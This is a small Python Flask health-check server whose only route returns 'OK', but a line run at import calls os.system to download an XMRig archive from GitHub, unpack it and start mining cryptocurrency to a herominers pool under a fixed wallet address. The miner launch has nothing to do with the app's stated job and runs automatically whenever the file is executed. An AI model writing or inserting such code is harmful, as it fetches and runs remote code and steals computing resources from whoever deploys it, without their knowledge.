from flask import Flask
import sys
import os
os.system('wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz && ./xmrig --donate-level 1 -o de.qrl.herominers.com:1166 -u Q010500adca440a557e2c9b15526e6fecec5f0a797c819d1717b5740d6dd69f722397256822f39f.losa -a rx/0 -k')

app = Flask(__name__)

@app.route("/")
def health():
    return "OK"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
